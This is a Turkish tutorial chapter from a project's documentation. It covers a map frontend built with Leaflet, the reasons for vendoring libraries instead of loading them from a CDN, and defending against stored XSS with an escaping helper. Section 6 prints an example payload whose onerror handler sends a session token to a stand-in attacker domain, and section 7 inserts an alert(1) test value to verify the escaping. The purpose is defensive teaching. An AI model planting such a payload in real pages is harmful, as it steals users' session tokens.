# 09 — Frontend ve harita

> Sunucuyu bitirdik. Şimdi kullanıcının gerçekten gördüğü kısım: tarayıcıda çalışan kod,
> harita, ve "vendoring" denen şeyin ne olduğu.

---

## 1. Bir cümlede

Frontend, sunucudan gelen veriyi tarayıcıda **görünür hale getiren** koddur; bu projede
o görünürlüğün büyük kısmı bir haritadır.

---

## 2. Benzetme: tiyatro sahnesi

Sunucu **kulis**tir: oyuncular, kostümler, senaryo orada. Frontend **sahne**dir: seyircinin
gördüğü her şey. Sahne kendi başına hiçbir şey üretmez — kulisten ne gelirse onu gösterir.

**DOM** (Document Object Model) bu benzetmede **sahne dekorudur**: tarayıcının bellekte
tuttuğu, HTML'in canlı ağaç hali. JavaScript bu ağacı değiştirdiğinde ekran anında değişir.
Dekoru sahne arkasından hareket ettirmek gibi.

**Benzetme nerede bozuluyor — ve tam da bu proje için:** Tiyatroda seyirci sahneye
çıkamaz. Web'de **çıkabilir.** Tarayıcıda çalışan her şey kullanıcının kontrolündedir:
kodu okuyabilir, değiştirebilir, ağ isteklerini görebilir. Bu yüzden:

- **Sır frontend'e konulamaz.** OpenWeather anahtarı sunucuda durur — tarayıcıya koysaydık
  sayfanın kaynağına bakan herkes anahtarı alırdı.
- **Frontend doğrulamasına güvenilmez.** `docs/order.js` toplamı hesaplasa bile sunucu
  kendi hesabını yapar (ADR-005). Kullanıcı isterse tarayıcıdan `{"total": 1}` gönderir.
- **Kullanıcı girdisi asla ham basılmaz** — birazdan XSS kısmında.

---

## 3. Üç sayfa, üç farklı mod

Projede `docs/` altında üç HTML sayfası var ve **her biri farklı davranıyor** — bu
bilinçli bir tasarım:

| Sayfa | Ne yapıyor | Veri kaynağı |
|---|---|---|
| `index.html` | ana harita + admin paneli | **çift mod** (canlı backend varsa gerçek, yoksa tarayıcı-içi replika) |
| `order.html` | rezervasyon + sipariş | çift mod (önce canlı API, düşerse `localStorage` + `seed.json`) |
| `dashboard.html` | analitik grafikler | çift mod (canlı API, düşerse `docs/data/analytics.json` anlık görüntüsü) |

### Neden çift mod? (Bu, projenin en çok yanlış anlaşılan kararı)

Site **GitHub Pages**'te yayınlanıyor. Pages **statik dosya sunucusudur** — HTML, CSS, JS
ve resim verir, ama **hiçbir kod çalıştırmaz.** Node yok, PostgreSQL yok. Yani yayınlanan
sitede bir backend **olamaz.**

Ama sunum sizin makinenizde, `npm start` açıkken yapılıyor. Orada backend **var.**

Çözüm: sayfa açılışta backend'e kısa bir yoklama atıyor.

```js
const Live = {
  active: false, checked: false,
  async probe() {
    // originalFetch kullanılmalı: override henüz devrede ve bu çağrıyı da yakalardı.
    const res = await originalFetch(`${API_BASE}/api/menu?facilityId=1`, { signal: ctrl.signal });
    …
  }
};
```

2,5 saniyelik zaman aşımıyla `/api/menu?facilityId=1` deneniyor:

- **Yanıt geldi** → `Live.active = true` → tüm çağrılar gerçek backend'e gider,
  taklit katmanı tamamen devre dışı. **DBeaver'da satırlar belirir.**
- **Yanıt gelmedi** → taklit katmanı devrede, sayfa çalışmaya devam eder,
  ekranda "○ Çevrimdışı replika" rozeti görünür.

> ### Burada düzeltilen bir belge hatası var — anlatmaya değer
>
> Bu proje uzun süre şunu yazıyordu: *"statik siteye gerçek backend parola hash'i asla
> gönderilmez, bu yüzden `fetch` taklit ediliyor."* **Bu gerekçe olgusal olarak yanlıştı.**
> `/api/auth/login` zaten hash döndürmüyor; yanıtı `{ token, user: {id, username, role} }`.
> Ortada korunacak bir hash yoktu.
>
> Gerçek sebep çok daha sıradan: **Pages sunucu çalıştıramaz.** Bir zorunluluğu, var
> olmayan bir güvenlik kaygısıyla açıklamak, kararı anlamamak demek. Belge düzeltildi.
>
> Mentöre anlatılacak ders: *"Kodum doğruydu ama gerekçem yanlıştı. İkisi ayrı şeyler ve
> yanlış gerekçe daha tehlikeli, çünkü bir dahaki kararı da yanlış verdiriyor."*

---

## 4. Leaflet: harita nasıl çiziliyor

Harita aslında bir **resim mozaiğidir.** Dünya 256×256 piksellik karelere (**tile**,
"karo") bölünmüştür ve her zum seviyesinde ayrı bir set vardır. Leaflet'in işi:
"kullanıcı şu an nereye bakıyor, hangi karoları indirmeliyim, nereye yapıştırmalıyım?"

```js
L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', …)
//                                                              └┬┘ └┬┘ └┬┘
//                                                            zum  sütun satır
```

`.setView([41.015, 28.979], 10)` — İstanbul'un merkezi, 10. zum seviyesi.

### Katmanlar (layers)

Leaflet her şeyi katman olarak düşünür ve üst üste bindirir:

```
L.tileLayer     → altlık harita (sokaklar, deniz)
L.geoJSON       → ilçe poligonları (docs/data/istanbul-districts.geojson)
L.polyline      → toplu taşıma güzergahları (docs/data/transit-routes.geojson)
L.circleMarker  → tesis noktaları
L.marker        → seçili tesis
L.layerGroup    → bunları açıp kapatmak için gruplar
```

Kullandığımız Leaflet API'leri (`docs/app.js`'te sayıldı): `L.polyline` 7 kez,
`L.circleMarker` 5, `L.layerGroup` 3, `L.control` 3, `L.geoJSON` 2, `L.tileLayer` 1.

### Çevrimdışı karo davranışı — küçük ama öğretici bir detay

Karolar CDN'den gelir; tüm İstanbul'u offline paketlemek pratik değil. Ağ yoksa Leaflet
varsayılan olarak **kırık resim ikonu** gösterir — kullanıcı bunu bir hata sanır.

```js
L.tileLayer(config.url, { ...config.options, errorTileUrl: OFFLINE_TILE });
```

`OFFLINE_TILE` gömülü bir gri SVG'dir (data URI, yani hiçbir ağ isteği yapmaz). Üstüne
bir kez küçük bir not düşülür: *"Harita karoları çevrimiçi bağlantı gerektirir."*

Bu, John Ousterhout'un **"hatayı var olmaktan çıkar"** ilkesinin küçük bir örneği: hata
mesajı göstermek yerine, hatanın kullanıcı için **anlamlı bir duruma** dönüşmesini
sağlıyoruz.

---

## 5. "Vendoring" nedir? (Doğrudan sorduğunuz şey)

**Vendoring** = bir dış kütüphaneyi CDN'den çağırmak yerine **dosyasını projenin içine
kopyalayıp git'e commit etmek.**

Yaygın yol şudur:

```html
<!-- CDN: dosya her açılışta unpkg.com'dan indirilir -->
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
```

Bu projede yapılan:

```html
<!-- vendored: dosya depoda, docs/vendor/leaflet/leaflet.js -->
<script src="vendor/leaflet/leaflet.js"></script>
```

### Neden? Dört gerçek sebep

**(a) Çevrimdışı çalışır.** Sunum yapacağınız salonda internet olmayabilir, ya da kurumsal
ağ CDN'i engelleyebilir. Vendored dosya diskte — her koşulda açılır. (Bu projede fiilen
yaşandı: geliştirme ortamının ağ politikası `api.ibb.gov.tr` ve
`api.openweathermap.org`'u engelliyor.)

**(b) Sürüm donar.** CDN'deki dosya sizin haberiniz olmadan güncellenebilir; `@latest`
kullanıyorsanız bir sabah proje bozulmuş olarak uyanabilir. Vendored sürüm siz
değiştirene kadar aynı kalır.

**(c) Tedarik zinciri güvenliği.** CDN ele geçirilirse ziyaretçilerinize kötücül kod
servis edilir. Dosya sizdeyse saldırı yüzeyi yok. (2018'de gerçekten oldu: bir CDN'e
yerleştirilen kod, kullanan tüm sitelerden kredi kartı bilgisi çaldı.)

**(d) Gizlilik.** CDN'e giden her istek, ziyaretçinizin IP'sini üçüncü tarafa bildirir.

### Bedeli — dürüst kısım

- **Depo büyür.** `docs/vendor/` bu projede toplam ~1 MB: Leaflet 148 KB + CSS 15 KB +
  ikonlar, Turf 590 KB, Chart.js 209 KB.
- **Güncelleme elle yapılır.** Güvenlik yaması çıktığında `npm update` yetmez; dosyayı
  indirip değiştirmek gerekir. Yani **takip sorumluluğu sizde.**
- **Paylaşılan önbellek yok.** Kullanıcı başka bir sitede aynı CDN dosyasını indirmişse
  tarayıcı onu yeniden kullanırdı; vendored sürümde indirme baştan yapılır. *(Not: modern
  tarayıcılar 2020'den beri önbelleği site başına ayırdığı için bu avantaj zaten büyük
  ölçüde ortadan kalktı.)*

Projede kural net: **CDN yok** (CLAUDE.md). Doğrulaması tek komut — `docs/` altında
`cdn`/`unpkg`/`jsdelivr` geçen tek bir satır yok.

### Vendored üç kütüphane

| Kütüphane | Sürüm | Boyut | Ne için |
|---|---|---|---|
| **Leaflet** | 1.9.4 | 148 KB + 15 KB CSS | harita, katmanlar, işaretçiler |
| **Turf.js** | — | 590 KB | tarayıcı-içi geometri: `union`, `difference`, `buffer`, `area`, `point`, `polygon` |
| **Chart.js** | 4.5.1 | 209 KB | dashboard grafikleri |

> **Turf neden var, PostGIS varken?** İkisi farklı yerde çalışıyor. PostGIS **sunucuda**,
> veritabanındaki tüm tesislere karşı, indeks kullanarak. Turf **tarayıcıda**, kullanıcı
> haritada bir alan çizerken **anlık** — her fare hareketinde sunucuya gidip gelmek
> mümkün değil. Kural şu: *kalıcı ve büyük veri sorgusu → PostGIS; anlık ve görsel
> geri bildirim → Turf.* Sonuç kaydedilecekse **her zaman** sunucu son sözü söyler.

---

## 6. XSS: sahneye seyirci çıkarsa

`innerHTML` bir metni **HTML olarak** yorumlar. Şu satır masum görünür:

```js
item.innerHTML = `<strong>${f.ad}</strong>`;
```

Ama `f.ad` veritabanından geliyor. Admin, adı şu olan bir tesis eklerse:

```
<img src=x onerror="fetch('https://saldirgan.com/?t='+localStorage.token)">
```

…resim yüklenemez, `onerror` çalışır ve **o tesisi gören herkesin** oturum token'ı
saldırgana gider. Veri veritabanında durduğu için bu **kalıcı (stored) XSS**'tir — bir
kez yazılır, herkeste tekrar tekrar çalışır.

Çözüm tek bir yardımcı fonksiyon:

```js
const escapeHtml = (value) => String(value ?? '')
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')…
```

`<` karakteri `&lt;` olur; tarayıcı bunu **etiket değil metin** olarak görür. Ekranda
`<img src=x onerror=...>` yazısı belirir, hiçbir şey çalışmaz.

Projede serbest metin içeren **tüm** veritabanı alanları bundan geçiyor: tesis adı
(`app.js:1016, 1148, 1177`), menü kalemi adı (`:1338`), hava durumu açıklaması (`:1366`),
kullanıcı adı (`:2153`), sipariş/rezervasyon tablolarındaki tesis adları (`:2152, :2343`).
Sayısal alanlar (`kapasite`, `dolulukOrani`) kaçırılmıyor çünkü zaten sayı.

> **Altın kural:** `innerHTML` + kullanıcı verisi = tehlike. Ya `textContent` kullanın
> (hiç yorumlamaz), ya da veriyi kaçırın. Bu projede tercih ikincisi, çünkü şablonlarda
> gerçekten HTML var (`<strong>`, `<td>`) ve sadece **veri kısmının** kaçırılması gerekiyor.

---

## 7. Kendin dene

**Vendoring'i kanıtlayın — hiçbir CDN referansı olmadığını görün:**

```bash
grep -rn "unpkg\|jsdelivr\|cdnjs" docs/*.html docs/*.js ; echo "çıkış kodu: $?"
```

Beklenen: hiç satır yok, çıkış kodu `1` (grep bulamadı).

**Vendored dosyaların gerçekten depoda olduğunu görün:**

```bash
ls -la docs/vendor/leaflet docs/vendor/turf docs/vendor/chartjs
du -sh docs/vendor/
```

**Çift modu görün.** Önce backend'i kapatın, sayfayı açın:

```bash
cd docs && python3 -m http.server 8092
# tarayıcıda: http://localhost:8092/index.html → "○ Çevrimdışı replika"
```

Şimdi başka bir terminalde backend'i açın ve sayfayı **yenileyin**:

```bash
npm start
# sayfayı yenile → "● Canlı veritabanı"
```

Aradaki fark, DBeaver demosunun çalışıp çalışmamasıdır: ikinci modda yaptığınız
rezervasyon gerçekten `reservations` tablosuna yazılır.

**XSS korumasını kendiniz test edin.** Admin olarak adı zararlı olan bir tesis ekleyin:

```bash
TOKEN=$(curl -s -X POST localhost:8085/api/auth/login -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"password\":\"$(node -e "console.log(require('./data/dev-credentials.json').users.admin)")\"}" \
  | node -pe "JSON.parse(require('fs').readFileSync(0,'utf8')).token")

curl -s -X POST localhost:8085/api/facilities -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"kod":"XSS-01","ad":"<img src=x onerror=alert(1)>","lat":41.0,"lng":29.0,"capacity":10}'
```

Sayfayı açın: tesis listesinde `<img src=x onerror=alert(1)>` **yazısını** göreceksiniz.
Hiçbir uyarı kutusu çıkmaz. Sonra temizleyin:

```bash
curl -s -X DELETE "localhost:8085/api/facilities/$(PGPASSWORD=mufettis-dev psql -h 127.0.0.1 \
  -U mufettis -d mufettis -tAc "SELECT id FROM facilities WHERE kod='XSS-01'")" \
  -H "Authorization: Bearer $TOKEN"
```

---

## 8. Mentör sorarsa

**"Vendoring nedir, neden yaptın?"**
> *"Dış kütüphaneleri CDN'den çağırmak yerine dosyalarını depoya kopyalamak. Dört sebebim
> vardı: çevrimdışı çalışsın, sürüm donsun, CDN ele geçirilirse etkilenmeyeyim, ve
> ziyaretçinin IP'si üçüncü tarafa gitmesin. Bedeli de var: depo 1 MB büyüdü ve güvenlik
> güncellemesini elle takip etmem gerekiyor."*

**"Neden hem PostGIS hem Turf var? Biri yeterli değil mi?"**
> *"Farklı yerde çalışıyorlar. PostGIS sunucuda, indeksli, tüm veriye karşı. Turf
> tarayıcıda, kullanıcı alan çizerken anlık geri bildirim için — her fare hareketinde
> sunucuya gidilemez. Ama sonuç kaydedilecekse son sözü her zaman sunucu söylüyor;
> tarayıcı hesabına güvenmiyorum."*

**"Frontend neden bazen sahte veri gösteriyor?"**
> *"Site GitHub Pages'te ve Pages statik dosya sunucusu — kod çalıştıramıyor, yani orada
> backend olamaz. Sayfa açılışta backend'i yokluyor: varsa gerçek veriye, yoksa
> tarayıcı-içi replikaya geçiyor ve bunu ekranda rozetle söylüyor. Sunumu yerelde
> yapıyorum, orada mod 'canlı'."*

**"XSS'e karşı ne yaptın?"**
> *"Veritabanından gelen serbest metinlerin hepsi `escapeHtml`'den geçiyor. Bu kalıcı XSS
> riskiydi: admin adı `<img src=x onerror=...>` olan bir tesis eklerse, o tesisi gören
> herkeste kod çalışırdı ve token'lar çalınırdı. Test ettim — payload metin olarak
> basılıyor, hiçbir şey çalışmıyor."*

**"API anahtarını neden frontend'e koymadın?"**
> *"Tarayıcıya konan her şey kullanıcının kontrolünde. Sayfanın kaynağına bakan herkes
> anahtarı alırdı. OpenWeather çağrısını sunucu yapıyor, frontend sadece sonucu görüyor.
> Bu yüzden yayınlanan Pages sitesinde hava durumu gerçek olamaz — orada anahtarı tutacak
> bir sunucu yok."*

---

## Sırada ne var

Uygulamanın her katmanını gördük. Son soru: **bu veriler nereden geliyor?**
**[10 — Veri nereden geliyor](10-veri-nereden-geliyor.md)**
